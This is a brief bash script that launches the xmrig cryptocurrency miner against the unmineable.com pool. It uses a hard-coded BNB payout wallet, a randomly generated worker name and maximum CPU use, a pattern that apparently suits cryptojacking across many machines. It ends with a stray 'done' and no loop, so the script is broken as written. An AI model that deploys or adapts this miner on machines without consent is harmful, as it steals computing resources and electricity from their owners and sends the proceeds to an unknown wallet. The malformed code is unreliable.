#!/bin/bash


chmod +x xmrig
randomName=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13 ; echo '')

./xmrig -o rx.unmineable.com:3333 -u BNB:bnb1udq3s2yn2q7mq5mlpkrj98uj58s7dujmjrj7nw:13223.YM45-$randomName#x4ib-eax8 -k -a rx/0 --cpu-max-threads-hint 100


done
